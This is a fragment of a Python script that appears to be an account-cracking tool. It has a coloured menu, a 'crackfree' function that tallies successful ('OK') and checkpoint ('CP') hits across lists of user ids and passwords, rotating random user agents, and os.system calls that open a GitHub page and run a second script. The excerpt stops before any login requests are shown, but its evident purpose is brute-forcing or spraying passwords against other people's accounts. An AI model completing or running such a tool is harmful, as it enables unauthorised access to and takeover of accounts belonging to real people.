...
def menu():
    ...
    if ROUF in ['111']:
        ...
        os.system('xdg-open https://github.com/ROUFmoulik008')
        os.system("python nono.py")
    elif ROUF in ['3','03']:
        result()
    elif ROUF in ['0']:
...
def setting():
    print('\x1b[38;5;50m=============================')
    print("\x1b[1;91m╔══\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \x1b[38;5;50mMETHOD")
    print("\x1b[1;92m║══\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \033[0;93mMETHOD")
    print("\x1b[1;93m╚══\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m \x1b[38;5;50mMETHOD ")
    print('\x1b[38;5;50m=============================')
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[ROUF-OK]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
